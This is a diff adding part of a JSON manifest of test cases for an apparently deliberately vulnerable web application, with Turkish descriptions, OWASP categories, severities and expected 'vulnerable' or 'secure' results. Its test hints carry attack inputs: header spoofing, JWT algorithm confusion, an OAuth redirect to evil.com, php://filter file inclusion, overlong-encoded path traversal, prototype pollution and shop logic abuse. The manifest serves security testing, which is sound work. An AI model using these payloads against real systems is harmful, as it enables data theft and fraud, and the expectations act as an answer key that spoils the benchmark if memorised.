+    "test_hint": "/edge/internal (Header X-Forwarded-For: 127.0.0.1)",
+    "severity": "medium"
+  },
+  {
+    "id": "EDGE-TRACE-01",
+    "method": "TRACE",
+    "path": "/edge/trace",
+    "category": "A05-Misconfig",
+    "vuln_type": "TRACE açık, çerez yankılanır (XST)",
+    "expectation": "vulnerable",
+    "test_hint": "/edge/trace (TRACE metodu)",
+    "severity": "low"
+  },
+  {
+    "id": "EDGE-XDOM-01",
+    "method": "GET",
+    "path": "/crossdomain.xml",
+    "category": "A05-Misconfig",
+    "vuln_type": "Permissive crossdomain.xml",
+    "expectation": "vulnerable",
+    "test_hint": "/crossdomain.xml",
+    "severity": "low"
+  },
+  {
+    "id": "EDGE-CFG-01",
+    "method": "GET",
+    "path": "/static/config.js",
+    "category": "A05-Exposure",
+    "vuln_type": "Build artifact anahtar ifşası",
+    "expectation": "vulnerable",
+    "test_hint": "/static/config.js",
+    "severity": "low"
+  },
+  {
+    "id": "CACHE-XFF-01",
+    "method": "GET",
+    "path": "/cache/echo",
+    "category": "A05-CacheSmuggle",
+    "vuln_type": "XFF yansıması + public cache",
+    "expectation": "vulnerable",
+    "test_hint": "/cache/echo (Header X-Forwarded-For: <script>)",
+    "severity": "medium"
+  },
+  {
+    "id": "AX-CONFUSE-01",
+    "method": "GET",
+    "path": "/authx/jwt-confuse",
+    "category": "A07-Auth",
+    "vuln_type": "JWT RS256->HS256 confusion (gerçek RSA)",
+    "expectation": "vulnerable",
+    "test_hint": "/authx/jwt-confuse (önce jwt-pubkey al, HS256 imzala)",
+    "severity": "high"
+  },
+  {
+    "id": "AX-PUBKEY-SECURE",
+    "method": "GET",
+    "path": "/authx/jwt-pubkey",
+    "category": "A07-Auth",
+    "vuln_type": "Public key endpoint (by design)",
+    "expectation": "secure",
+    "test_hint": "/authx/jwt-pubkey",
+    "severity": "info"
+  },
+  {
+    "id": "AX-REUSE-01",
+    "method": "GET",
+    "path": "/authx/reset-reuse",
+    "category": "A07-Auth",
+    "vuln_type": "Reset token süresiz + tekrar kullanımlı",
+    "expectation": "vulnerable",
+    "test_hint": "/authx/reset-reuse?token=FIXED123 (defalarca)",
+    "severity": "medium"
+  },
+  {
+    "id": "AX-NOSTATE-01",
+    "method": "GET",
+    "path": "/authx/oauth-nostate",
+    "category": "A07-Auth",
+    "vuln_type": "OAuth state parametresiz (connect-CSRF)",
+    "expectation": "vulnerable",
+    "test_hint": "/authx/oauth-nostate?client_id=x&redirect_uri=https://evil.com/cb",
+    "severity": "medium"
+  },
+  {
+    "id": "AX-REMEMBER-01",
+    "method": "GET",
+    "path": "/authx/remember",
+    "category": "A07-Auth",
+    "vuln_type": "Remember-me 10 yıl + HttpOnlysiz",
+    "expectation": "vulnerable",
+    "test_hint": "/authx/remember",
+    "severity": "low"
+  },
+  {
+    "id": "FILE-WRAP-01",
+    "method": "GET",
+    "path": "/files/include",
+    "category": "A04-FileHandling",
+    "vuln_type": "LFI wrapperlar (php://filter, data://...)",
+    "expectation": "vulnerable",
+    "test_hint": "/files/include?mod=php://filter/convert.base64-encode/resource=config",
+    "severity": "high"
+  },
+  {
+    "id": "FILE-UNI-01",
+    "method": "GET",
+    "path": "/files/download",
+    "category": "A04-FileHandling",
+    "vuln_type": "Unicode/overlong traversal + ADS",
+    "expectation": "vulnerable",
+    "test_hint": "/files/download?file=%c0%ae%c0%ae/secrets.txt",
+    "severity": "high"
+  },
+  {
+    "id": "APP-EMAIL-01",
+    "method": "POST",
+    "path": "/app/api/email",
+    "category": "APP-Shop",
+    "vuln_type": "E-posta doğrulamasız değişir (gasp)",
+    "expectation": "vulnerable",
+    "test_hint": "/app/api/email {email:kurban@x} (Bearer)",
+    "severity": "high"
+  },
+  {
+    "id": "APP-GIFT-01",
+    "method": "POST",
+    "path": "/app/api/giftcard",
+    "category": "APP-Shop",
+    "vuln_type": "Hediye çeki keyfi tutarla basılır",
+    "expectation": "vulnerable",
+    "test_hint": "/app/api/giftcard {amount:100000} (Bearer)",
+    "severity": "high"
+  },
+  {
+    "id": "APP-POINTS-01",
+    "method": "POST",
+    "path": "/app/api/points",
+    "category": "APP-Shop",
+    "vuln_type": "Negatif puan transferi",
+    "expectation": "vulnerable",
+    "test_hint": "/app/api/points {to:1, amount:-5000} (Bearer)",
+    "severity": "medium"
+  },
+  {
+    "id": "APP-SHIP-01",
+    "method": "POST",
+    "path": "/app/api/shipping",
+    "category": "APP-Shop",
+    "vuln_type": "Kargo ağırlığı client'tan (0=bedava)",
+    "expectation": "vulnerable",
+    "test_hint": "/app/api/shipping {weight:0} (Bearer)",
+    "severity": "low"
+  },
+  {
+    "id": "APP-REG-01",
+    "method": "POST",
+    "path": "/app/api/register-check",
+    "category": "APP-Shop",
+    "vuln_type": "Kayıt oracle kullanıcı enumeration",
+    "expectation": "vulnerable",
+    "test_hint": "/app/api/register-check {username:admin} -> 409",
+    "severity": "low"
+  },
+  {
+    "id": "APP-REG-01-SECURE",
+    "method": "POST",
+    "path": "/app/api/register-check-secure",
+    "category": "APP-Shop",
+    "vuln_type": "Kayıt oracle yok control",
+    "expectation": "secure",
+    "test_hint": "/app/api/register-check-secure",
+    "severity": "info"
+  },
+  {
+    "id": "XSS-MXSS-01",
+    "method": "GET",
+    "path": "/xss/mxss",
+    "category": "A03-XSS",
+    "vuln_type": "mXSS (innerHTML round-trip mutasyonu)",
+    "expectation": "vulnerable",
+    "test_hint": "/xss/mxss?html=mutation payload",
+    "severity": "medium"
+  },
+  {
+    "id": "CL-PPOLLQ-01",
+    "method": "GET",
+    "path": "/client/pollute-q",
+    "category": "Client-Side",
+    "vuln_type": "Query-string proto pollution",
+    "expectation": "vulnerable",
+    "test_hint": "/client/pollute-q?__proto__[isAdmin]=true",
+    "severity": "medium"
+  }
+]
